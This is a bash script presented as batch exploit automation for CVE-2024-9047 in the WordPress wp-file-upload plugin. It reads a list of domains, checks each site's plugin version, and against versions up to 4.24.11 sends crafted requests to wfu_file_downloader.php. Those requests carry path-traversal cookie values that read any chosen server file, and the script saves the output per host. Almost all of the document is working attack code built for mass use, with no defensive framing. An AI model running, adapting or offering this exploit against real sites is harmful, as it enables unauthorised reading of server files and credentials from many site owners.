#!/bin/bash

# CVE-2024-9047 Exploit Automation by @VeryLazyTech - Modified for batch mode

banner() {
cat <<'EOF' 
  ______     _______   ____   ___ ____  _  _      ___   ___  _  _ _____ 
 / ___\ \   / / ____| |___ \ / _ \___ \| || |    / _ \ / _ \| || |___  |
| |    \ \ / /|  _|     __) | | | |__) | || |_  | (_) | | | | || |_ / / 
| |___  \ V / | |___   / __/| |_| / __/|__   _|  \__, | |_| |__   _/ /  
 \____|  \_/  |_____| |_____|\___/_____|  |_|      /_/ \___/   |_|/_/   

@VeryLazyTech - Batch Exploit Mode
EOF
}

# Call the banner
banner

RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
NC="\033[0m" # No Color

set -e

# Check input
if [ "$#" -ne 2 ]; then
    echo -e "${RED}Usage: $0 <domains.txt> <file-to-read>${NC}"
    exit 1
fi

DOMAIN_LIST="$1"
TARGET_FILE="$2"

# Exploit Constants
PLUGIN_PATH="/wp-content/plugins/wp-file-upload/"
VERSION_FILE="release_notes.txt"
EXPLOIT_PATH="wfu_file_downloader.php"
FILE_CODE="pQ1DyzbQp5hBxQpW"
TICKET="Hw8h7dBmxROx27ZZ"
HANDLER="dboption"
SESSION_LEGACY="1"
DBOPTION_BASE="cookies"
DBOPTION_USEOLD="0"
COOKIE_VALUE="cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC3"
VULNERABLE_VERSION="4.24.11"
ABSPATH="/"

while read -r HOST; do
    [[ -z "$HOST" ]] && continue
    echo -e "${BLUE}[*] Checking ${HOST}...${NC}"
    VERSION_URL="http://${HOST}${PLUGIN_PATH}${VERSION_FILE}"
    VERSION=$(curl -s "${VERSION_URL}" | grep -oP 'Version\s+\K[0-9]+\.[0-9]+\.[0-9]+' | head -n 1)

    if [[ -z "${VERSION}" ]]; then
        echo -e "${YELLOW}[!] Plugin version not found at ${HOST}. Skipping.${NC}"
        continue
    fi

    echo -e "[*] Detected plugin version: ${VERSION}"

    if dpkg --compare-versions "${VERSION}" le "${VULNERABLE_VERSION}"; then
        echo -e "${RED}[!] ${HOST} is vulnerable! Exploiting...${NC}"
        
        TIMESTAMP=$(date +%s)
        STORAGE_VALUE="/../../../../../${TARGET_FILE}"
        EXPLOIT_URL="http://${HOST}${PLUGIN_PATH}${EXPLOIT_PATH}?file=${FILE_CODE}&ticket=${TICKET}&handler=${HANDLER}&session_legacy=${SESSION_LEGACY}&dboption_base=${DBOPTION_BASE}&dboption_useold=${DBOPTION_USEOLD}&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce"

        curl -s -X GET "${EXPLOIT_URL}" \
          -H "Host: ${HOST}" \
          -H "Cookie: wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=${COOKIE_VALUE}; wfu_storage_${FILE_CODE}=${STORAGE_VALUE}; wfu_download_ticket_${TICKET}=${TIMESTAMP}; wfu_ABSPATH=${ABSPATH};" \
          -H "User-Agent: Mozilla/5.0" \
          -H "Accept: */*" \
          -H "Connection: close" \
          --compressed | tee -a "output_${HOST}.txt"

    else
        echo -e "${YELLOW}[-] ${HOST} not vulnerable. Skipping.${NC}"
    fi
    echo -e "${BLUE}------------------------------------------${NC}"
done < "$DOMAIN_LIST"

